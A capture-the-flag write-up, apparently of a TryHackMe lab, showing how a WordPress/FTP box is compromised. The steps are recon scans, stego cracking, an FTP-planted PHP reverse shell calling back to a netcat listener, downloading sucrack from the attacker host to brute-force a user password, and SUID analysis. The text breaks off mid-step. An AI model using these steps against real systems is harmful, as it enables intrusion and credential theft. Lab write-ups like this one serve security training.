# Different-CTF-Writeup

**Let's start with nmap scanning first**

**Command:** `nmap -vv -sCV -p- 10.10.70.160`

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello World &#8211; Just another WordPress site
Service Info: OS: Unix

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.57 seconds
           Raw packets sent: 1083 (47.628KB) | Rcvd: 1045 (41.796KB)
```      

**We see that http and ftp ports are open. Let's continue by sending a directory scan to the http port**

**Command:** `gobuster dir -u http://10.10.70.160 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 2>/dev/null`

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.70.160
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/16 12:19:41 Starting gobuster
===============================================================
/wp-content (Status: 301)
/an*********** (Status: 301)
/wp-includes (Status: 301)
/javascript (Status: 301)
/wp-admin (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
2021/02/16 12:28:38 Finished
===============================================================
```
**Let's visit the directory we found**

```
Index of /an***********
[ICO]	           Name	                            Last modified       Size	Description
[PARENTDIR]        Parent Directory	 	                        - 	 
[IMG]	           austrailian-bulldog-ant.jpg      2021-01-11 11:51 	58K	 
[TXT]	           wordlist.txt                     2021-01-11 13:48 	394K	 
Apache/2.4.29 (Ubuntu) Server at 10.10.70.160 Port 80
```
**Let's get these two files**

**Command:** `wget http://10.10.70.160/announcements/austrailian-bulldog-ant.jpg && wget http://10.10.70.160/announcements/wordlist.txt`

**Let's brute the photo using stegcracker**

**Command:** `stegcracker austrailian-bulldog-ant.jpg wordlist.txt`

```
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'austrailian-bulldog-ant.jpg' with wordlist 'wordlist.txt'..
Successfully cracked file with password: 1**************r
Tried 49508 passwords
Your file has been written to: austrailian-bulldog-ant.jpg.out
1**************r
```
**Now we can look at our photo with steghide**

**Command:** `steghide extract -sf austrailian-bulldog-ant.jpg`

```
Enter passphrase: 
wrote extracted data to "user-pass-ftp.txt".
```
**Let's read the file named user-pass-ftp.txt**

**Command:** `cat user-pass-ftp.txt`

```
RlRQLUxPR0lOClVT****************************M2FkYW5hY3JhY2s=
```
**Encrypted with base64**

**Command:** `cat user-pass-ftp.txt |base64 -d`

```
FTP-LOGIN
USER: h******p
PASS: 1***********k
```
**Pretty good ... We can now connect via ftp port**

**Command:** `ftp 10.10.70.160` & `ls -la`

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    8 1001     1001         4096 Jan 15 12:26 .
drwxrwxrwx    8 1001     1001         4096 Jan 15 12:26 ..
-rw-------    1 1001     1001           88 Jan 13 11:06 .bash_history
drwx------    2 1001     1001         4096 Jan 11 10:29 .cache
drwx------    3 1001     1001         4096 Jan 11 10:29 .gnupg
-rw-r--r--    1 1001     1001          554 Jan 10 22:26 .htaccess
drwxr-xr-x    2 0        0            4096 Jan 14 16:49 an***********
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08 22:13 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08 21:15 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11 09:55 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08 22:13 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08 22:13 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09 10:53 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12 14:43 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30 21:54 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08 21:15 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
226 Directory send OK.
```

**I think the web files are installed in ftp. We can easily get php shell from here.**
```https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php```

**Command:** `put php-reverse-shell.php` & `chmod 777 php-reverse-shell.php`

**Now we can start our listener and get our inverted shell.**

**Command:** `nc -lvp 4444`

**But when we visit the web page with the reverse shell, we get a 404 file not found error.. This is because the files we see in ftp are either on a different port or in a different domain. Since this is a wordpress cms, we can get the domain information from phpmyadmin by getting the datebase information from the wp-config.php file in ftp.**

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '*****' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```
**Now we can go to phpmyadmin. There are two different datebases created. When we look at these in order. It seems that there is a different sub domain in "wp-options"**

```
 	Edit Edit 	Copy Copy 	Delete Delete 	1 	siteurl 	http://********.adana.thm 	yes
```
**We add the domain name we find to our / etc / hosts file. Now we know where our php shelf is. We start listening again and get our shell.**

```
listening on [any] 4444 ...
connect to [10.9.45.10] from adana.thm [10.10.70.160] 43000
Linux ubuntu 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 19:06:50 up  2:07,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

**We spawn pty with Python and export xterm.**

**Command:** `python -c 'import pty;pty.spawn("/bin/bash")'` & `export TERM=xterm`

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/$
```
**We can now get the web flag**

**Command:** `cd /var/www/html` & `cat wwe********.txt`
```
THM{343a7e20***************1c346edff}
```

**When we want to scan for SUID, we see that we are not authorized to use find.**

**Command:** `ls -la /usr/bin/find`
```
-rwxr-x--- 1 root hakanbey 238080 Nov  5  2017 /usr/bin/find
```

**In this case, we know that we need to switch to the hakanbey user. Due to the similarity of stego and ftp passwords, the password of the hakanbey user can also be in this format.**

**123adana antinwar**
**123adana crack**
**123adana this is our format and we have a word list**
**We code a simple script with Python**
```
file = open('wordlist.txt','r')
file2 = open('new.txt','w')
for line in file :
        b= '123adana' + line
        file2.write(b)
file.close()
file2.close()
```
**We send sucracker to work on the opposite machine.**

**Command:**`python3 -m http.server 8000`
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
**Command:** `wget 10.9.45.10:8000/sucrack_1.2.3-5+b1_amd64.deb`
```
--2021-02-16 19:34:50--  http://10.9.45.10:8000/sucrack_1.2.3-5+b1_amd64.deb
Connecting to 10.9.45.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18748 (18K) [application/vnd.debian.binary-package]
Saving to: 'sucrack_1.2.3-5+b1_amd64.deb'

sucrack_1.2.3-5+b1_ 100%[===================>]  18.31K  --.-KB/s    in 0.1s    

2021-02-16 19:34:50 (175 KB/s) - 'sucrack_1.2.3-5+b1_amd64.deb' saved [18748/18748]
```
**Command:**`dpkg -x sucrack_1.2.3-5+b1_amd64.deb sucrack` & `ls`

**Command:**`cd /sucrack/usr/bin/`

**We're bringing the new word list we created called "new.txt" here.**

**Command:**`wget 10.9.45.10:8000/new.txt`
```
--2021-02-16 19:40:50--  http://10.9.45.10:8000/new.txt
Connecting to 10.9.45.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 803891 (785K) [text/plain]
Saving to: 'new.txt'

new.txt             100%[===================>] 785.05K   508KB/s    in 1.5s    

2021-02-16 19:40:51 (508 KB/s) - 'new.txt' saved [803891/803891]
```
**We can now initiate brute force with sukrack.**

**Command:**`./sucrack -w 100 -b 500 -u hakanbey new.txt`
**And in a short time like two minutes, the password of a user named hakanbey is broken.**

**Command:**`su hakanbey`

**Bingo .. We have succeeded in becoming a hakanbey user. We can now read user.txt and scan for SUID.**
```
THM{8ba9d7******************d00e67127}
```

**Command:**`find / -perm -4000 -type f 2>/dev/null`
```
/bin/fusermount
/bin/su
/bin/umount
/bin/mount
/bin/ping
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/arping
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/binary
/usr/bin/at
/usr/bin/newgrp
/usr/sbin/pppd
/usr/sbin/exim4
```
**When we examine the SUID file named /usr/bin/binary, we understand that it requested a correct word from us.**

**Command:**`strings /usr/bin/binary`

```
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
zoneH
 pts
AWAVI
AUATL
[]A\A]A^A_
I think you should enter the correct string here ==>
/root/hint.txt
Hint! : %s
/root/root.jpg
Unable to open source!
/home/hakanbey/root.jpg
Copy /root/root.jpg ==> /home/hakanbey/root.jpg
Unable to copy!
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
```

**When we open the binary file with ltrace, we find the correct word.**

**Command:**`cd /usr/bin/` & `ltrace ./binary`

```
strcat("***", "****")                                                                                    = "******"
strcat("******", "**")                                                                                  = "********"
strcat("*********", "***")                                                                               = "************"
strcat("************", "**")                                                                             = "*************"
printf("I think you should enter the cor"...)                                                            = 52
__isoc99_scanf(0x561c5b518edd, 0x7fff99056ac0, 0, 0I think you should enter the correct string here ==>^C <no return ...>
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
```
**Now let's run the file and enter the correct word.**

**Command:**`./binary`
```
